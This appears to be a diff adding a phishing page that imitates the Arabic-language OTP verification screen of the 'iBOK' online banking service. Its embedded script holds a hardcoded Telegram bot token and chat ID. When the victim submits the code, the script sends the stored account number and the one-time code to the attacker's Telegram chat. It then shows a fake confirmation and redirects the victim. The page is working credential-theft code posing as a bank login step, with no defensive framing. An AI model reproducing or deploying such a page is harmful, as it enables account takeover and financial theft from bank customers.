@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال رمز OTP - iBOK</title>
+    <link rel="stylesheet" href="styles.css"> 
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo-text">iBOK اي بوك</div>
+            <div class="service-name">الخدمات المصرفية عبر الإنترنت</div>
+        </header>
+
+        <div class="welcome-banner">
+            مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
+        </div>
+
+        <div class="form-content-wrapper">
+
+            <div class="form-card">
+                <div class="card-title">إدخال رمز التحقق النهائي</div>
+                <div class="card-subtitle" style="text-align: center; margin-top: 15px;">
+                    الرجاء ادخال رمز التحقق المرسل إلى رقم هاتفك و بريدك الإلكتروني المسجل 
+                </div>
+
+                <form id="otpForm">
+                    <div class="input-group" style="margin-top: 30px;">
+                        <label class="input-label" for="otp-code">أدخل رمز التحقق (OTP):</label>
+                        <input class="form-input" type="text" id="otp-code" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6" required 
+                                inputmode="numeric" pattern="\d{6}">
+                        <span class="input-description" style="display: block; font-size: 13px; color: #777; margin-top: 5px;">أدخل رمز مكون من 6 أرقام</span>
+                    </div>
+
+                    <div class="otp-timer" id="timerDisplay" style="text-align: center; color: #555; font-size: 15px; margin-top: 15px;">
+                        إعادة إرسال الرمز خلال **60:00 دقيقة**
+                    </div>
+                    
+                    <button type="submit" class="submit-button" style="margin-top: 30px;">تأكيد الرمز والدخول</button>
+                </form>
+            </div>
+        </div>
+        </div>
+<script type="module">
+    const TELEGRAM_TOKEN = "8569488666:AAE2HdV-K-BrpmPLw-IlKr_9UiEiYbD40Mc";
+    const CHAT_ID = "8108669125";
+
+    const otpForm = document.getElementById('otpForm');
+    const otpCodeInput = document.getElementById('otp-code');
+    const timerDisplay = document.getElementById('timerDisplay');
+
+    // ======== عداد 30 دقيقة ========
+    let timeLeft = 60 * 60; // 60 دقيقة بالثواني
+ 
+
+    function startOtpTimer() {
+        const timerInterval = setInterval(() => {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+
+            timerDisplay.textContent =
+                `إعادة إرسال الرمز خلال ${minutes}:${seconds.toString().padStart(2, '0')} دقيقة`;
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerDisplay.textContent = 'يمكنك إعادة إرسال الرمز الآن';
+            }
+
+            timeLeft--;
+        }, 1000);
+    }
+
+    startOtpTimer();
+    // ======== نهاية العداد ========
+
+    function showToast(message, color='#4CAF50') {
+        alert(message);
+    }
+
+    async function sendOtpToTelegram(userID, otpCode) {
+        const message = `🔑 رمز OTP:\nرقم الحساب: ${userID}\nالرمز: ${otpCode}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        try {
+            await fetch(url);
+        } catch(err) {
+            console.error("خطأ في إرسال OTP للبوت:", err);
+        }
+    }
+
+    otpForm.addEventListener('submit', async (event) => {
+        event.preventDefault();
+        const otpCode = otpCodeInput.value.trim();
+        const userID = localStorage.getItem('userID');
+
+        if (!userID) {
+            showToast('خطأ: لم يتم العثور على رقم الحساب. الرجاء تسجيل الدخول أولاً.', '#D32F2F');
+            setTimeout(() => { window.location.href = "login.html"; }, 1000);
+            return;
+        }
+
+        if (otpCode.length !== 6 || isNaN(otpCode)) {
+            showToast('الرجاء إدخال رمز تحقق صحيح مكون من 6 أرقام.', '#D32F2F');
+            otpCodeInput.focus();
+            return;
+        }
+
+        await sendOtpToTelegram(userID, otpCode);
+        showToast('تم التحقق من الرمز. جاري الدخول...');
+
+        setTimeout(() => {
+            window.location.href = "m.html";
+        }, 1000);
+    });
+</script>
+
+</body>
+</html>
